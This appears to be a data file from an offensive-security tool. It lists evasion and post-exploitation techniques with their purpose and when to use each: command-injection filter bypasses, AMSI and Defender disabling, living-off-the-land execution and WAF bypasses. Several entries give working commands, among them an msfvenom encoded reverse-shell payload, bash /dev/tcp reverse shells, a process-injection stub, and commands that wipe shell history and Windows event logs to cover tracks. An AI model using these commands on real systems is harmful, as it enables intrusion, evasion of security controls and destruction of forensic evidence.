techniques.name: Command Injection - Slash Bypass (c/at)
techniques.purpose: Bypass blacklist filtering specific command names
techniques.when_to_use: When 'cat' is blacklisted by WAF or filter

techniques.name: Command Injection - Space Bypass
techniques.purpose: Bypass space character filtering
techniques.when_to_use: When spaces are filtered in command injection

techniques.name: Command Injection - Semicolon/Newline Bypass
techniques.purpose: Bypass && and || operator filters
techniques.when_to_use: When && and | are filtered

techniques.name: Command Injection - Backtick/Subshell
techniques.purpose: Execute commands inside other commands
techniques.when_to_use: When semicolons are filtered

techniques.name: PowerShell - Execution Policy Bypass
techniques.purpose: Run PowerShell scripts when policy blocks them
techniques.when_to_use: When PowerShell execution policy is Restricted

techniques.name: PowerShell - AMSI Bypass (Memory Patch)
techniques.purpose: Disable AMSI to run malicious scripts
techniques.when_to_use: When AMSI is blocking PowerShell payloads

techniques.name: PowerShell - Base64 Encoded Command
techniques.purpose: Obfuscate PowerShell commands
techniques.when_to_use: When plain PowerShell is detected/blocked

techniques.name: Windows Defender Exclusion
techniques.purpose: Add path to Defender exclusion list
techniques.when_to_use: After gaining admin — before dropping payloads

techniques.name: Disable Windows Defender
techniques.purpose: Completely disable Windows Defender
techniques.when_to_use: After gaining admin access on Windows

techniques.name: msfvenom Encoded Payload
techniques.purpose: Encode payload to evade AV signatures
techniques.when_to_use: When plain msfvenom payloads are detected
techniques.command: msfvenom -p windows/x64/shell_reverse_tcp LHOST={TARGET_IP} LPORT=4444 -e x64/xor_dynamic -i 5 -f exe -o shell_enc.exe

techniques.name: Living off the Land - Regsvr32
techniques.purpose: Execute payload using trusted Windows binary
techniques.when_to_use: When .exe execution is blocked

techniques.name: Living off the Land - Mshta
techniques.purpose: Execute HTA payload via trusted binary
techniques.when_to_use: When .exe is blocked but mshta is available

techniques.name: Living off the Land - Certutil Decode
techniques.purpose: Decode and execute payload via certutil
techniques.when_to_use: When direct execution is blocked

techniques.name: Linux - Obfuscate Command with Variables
techniques.purpose: Bypass string-based command filters
techniques.when_to_use: When specific command strings are blacklisted

techniques.name: Linux - Reverse Shell via /dev/tcp (No nc)
techniques.purpose: Get reverse shell without netcat
techniques.when_to_use: When netcat is not available on target
techniques.command:
bash -i >& /dev/tcp/{TARGET_IP}/4444 0>&1
exec 5<>/dev/tcp/{TARGET_IP}/4444; cat <&5 | while read line; do $line 2>&5 >&5; done

techniques.name: WAF Bypass - URL Encoding
techniques.purpose: Bypass WAF by encoding special characters
techniques.when_to_use: When WAF blocks special characters in URL

techniques.name: WAF Bypass - Case Variation (SQLi)
techniques.purpose: Bypass case-sensitive WAF rules
techniques.when_to_use: When WAF blocks lowercase SQL keywords

techniques.name: WAF Bypass - Comment Injection (SQLi)
techniques.purpose: Break up SQL keywords with comments
techniques.when_to_use: When WAF detects SQL keywords

techniques.name: Process Injection via PowerShell
techniques.purpose: Inject shellcode into legitimate process
techniques.when_to_use: When AV monitors new process creation
techniques.command:
$pid = (Get-Process explorer).Id
# Use Invoke-Shellcode or similar to inject into PID

techniques.name: Timestomp - Modify File Timestamps
techniques.purpose: Hide file creation time to avoid forensics
techniques.when_to_use: After dropping files on target

techniques.name: Clear Bash History
techniques.purpose: Remove command history to cover tracks
techniques.when_to_use: Before leaving a compromised Linux host
techniques.command:
history -c && history -w
unset HISTFILE
export HISTSIZE=0
rm -f ~/.bash_history

techniques.name: Clear Windows Event Logs
techniques.purpose: Remove evidence from Windows event logs
techniques.when_to_use: Before leaving a compromised Windows host
techniques.command:
wevtutil cl System && wevtutil cl Security && wevtutil cl Application
Get-EventLog -List | ForEach-Object { Clear-EventLog $_.Log }
